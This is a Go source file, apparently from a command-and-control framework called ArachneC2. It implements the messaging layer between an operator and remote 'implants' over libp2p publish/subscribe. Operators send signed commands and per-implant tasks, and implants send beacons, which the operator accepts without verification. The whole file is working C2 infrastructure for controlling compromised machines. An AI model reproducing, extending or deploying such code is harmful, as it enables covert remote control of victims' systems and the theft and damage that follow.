package transport

import (
	"context"
	"fmt"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"

	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/peer"

	arachnepb "github.com/portbuster1337/ArachneC2/protobuf/arachnepb"
	"github.com/portbuster1337/ArachneC2/pkg/cryptography"
)

var ErrSignatureInvalid = fmt.Errorf("signature invalid")

type MessageHandler func(ctx context.Context, envelope *arachnepb.Envelope, senderPub crypto.PubKey)

type Messenger struct {
	node          *Node
	handler       MessageHandler
	privKey       crypto.PrivKey
	operatorID    peer.ID
	trustedPubKey crypto.PubKey
	knownImplants map[string]crypto.PubKey
	mu            sync.RWMutex
}

func NewOperatorMessenger(ctx context.Context, node *Node, keys *cryptography.OperatorKey) *Messenger {
	return &Messenger{
		node:          node,
		privKey:       keys.PrivateKey,
		operatorID:    node.ID(),
		knownImplants: make(map[string]crypto.PubKey),
	}
}

func NewImplantMessenger(ctx context.Context, node *Node, keys *cryptography.ImplantKey, operatorPub crypto.PubKey) *Messenger {
	opID, err := peer.IDFromPublicKey(operatorPub)
	if err != nil {
		opID = peer.ID("")
	}
	return &Messenger{
		node:          node,
		privKey:       keys.PrivateKey,
		operatorID:    opID,
		trustedPubKey: operatorPub,
		knownImplants: make(map[string]crypto.PubKey),
	}
}

func (m *Messenger) SetHandler(handler MessageHandler) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.handler = handler
}

func (m *Messenger) AddKnownImplant(peerID string, pub crypto.PubKey) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.knownImplants[peerID] = pub
}

func (m *Messenger) KnownImplant(peerID string) crypto.PubKey {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.knownImplants[peerID]
}

// CommandTopic returns the topic where operators publish commands.
// Format: /arachne/<operator-peerid>/commands
func (m *Messenger) CommandTopic() string {
	return CommandTopicPrefix + m.operatorID.String() + CommandsSuffix
}

// BeaconTopic returns the topic where implants publish beacons.
// Format: /arachne/<operator-peerid>/beacons
func (m *Messenger) BeaconTopic() string {
	return BeaconTopicPrefix + m.operatorID.String() + BeaconsSuffix
}

// TaskTopic returns a per-implant topic for targeted commands.
// Format: /arachne/<operator-peerid>/tasks/<implant-peerid>
func (m *Messenger) TaskTopic(implantPeerID string) string {
	return BeaconTopicPrefix + m.operatorID.String() + TasksSuffix + implantPeerID
}

func VerifyEnvelope(env *arachnepb.Envelope, trustedPub crypto.PubKey) error {
	if trustedPub == nil {
		return fmt.Errorf("no trusted public key configured")
	}
	if len(env.Signature) == 0 {
		return fmt.Errorf("%w: missing signature", ErrSignatureInvalid)
	}
	ok, err := cryptography.Verify(trustedPub, env.Data, env.Signature)
	if err != nil {
		return fmt.Errorf("verify: %w", err)
	}
	if !ok {
		return ErrSignatureInvalid
	}
	return nil
}

func PubKeyFromEnvelope(env *arachnepb.Envelope) (crypto.PubKey, error) {
	if len(env.SenderKey) == 0 {
		return nil, fmt.Errorf("no sender key in envelope")
	}
	return cryptography.PubKeyFromBytes(env.SenderKey)
}

func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted func() crypto.PubKey) error {
	sub, err := m.node.Subscribe(topic)
	if err != nil {
		return fmt.Errorf("subscribe %s: %w", topic, err)
	}
	go func() {
		for {
			msg, err := sub.Next(ctx)
			if err != nil {
				return
			}
			env := &arachnepb.Envelope{}
			if err := proto.Unmarshal(msg.Data, env); err != nil {
				continue
			}

			trusted := getTrusted()
			if trusted == nil {
				m.deliver(ctx, env)
				continue
			}

			if err := VerifyEnvelope(env, trusted); err != nil {
				continue
			}
			m.deliver(ctx, env)
		}
	}()
	return nil
}

func (m *Messenger) ListenBeacons(ctx context.Context) error {
	return m.listenVerified(ctx, m.BeaconTopic(), func() crypto.PubKey {
		return nil
	})
}

func (m *Messenger) ListenCommands(ctx context.Context) error {
	return m.listenVerified(ctx, m.CommandTopic(), func() crypto.PubKey {
		m.mu.RLock()
		defer m.mu.RUnlock()
		return m.trustedPubKey
	})
}

func (m *Messenger) deliver(ctx context.Context, env *arachnepb.Envelope) {
	m.mu.RLock()
	handler := m.handler
	m.mu.RUnlock()
	if handler == nil {
		return
	}
	var pubKey crypto.PubKey
	if len(env.SenderKey) > 0 {
		pubKey, _ = PubKeyFromEnvelope(env)
	}
	handler(ctx, env, pubKey)
}

func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *arachnepb.Envelope) error {
	data, err := proto.Marshal(env)
	if err != nil {
		return fmt.Errorf("marshal envelope: %w", err)
	}
	return m.node.Publish(ctx, topic, data)
}

func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *arachnepb.Envelope) error {
	if m.privKey == nil {
		return fmt.Errorf("no private key for signing")
	}
	sig, err := m.privKey.Sign(env.Data)
	if err != nil {
		return fmt.Errorf("sign: %w", err)
	}
	env.Signature = sig

	pubBytes, err := crypto.MarshalPublicKey(m.privKey.GetPublic())
	if err == nil {
		env.SenderKey = pubBytes
	}
	return m.SendEnvelope(ctx, topic, env)
}

func (m *Messenger) CreateEnvelope(msgType uint32, data []byte) *arachnepb.Envelope {
	return &arachnepb.Envelope{
		ID:   time.Now().UnixNano(),
		Type: msgType,
		Data: data,
	}
}

func (m *Messenger) RendezvousString() string {
	return "arachne/" + m.operatorID.String()
}

func (m *Messenger) OperatorID() peer.ID {
	return m.operatorID
}

func (m *Messenger) SetOperatorID(id peer.ID) {
	m.operatorID = id
}
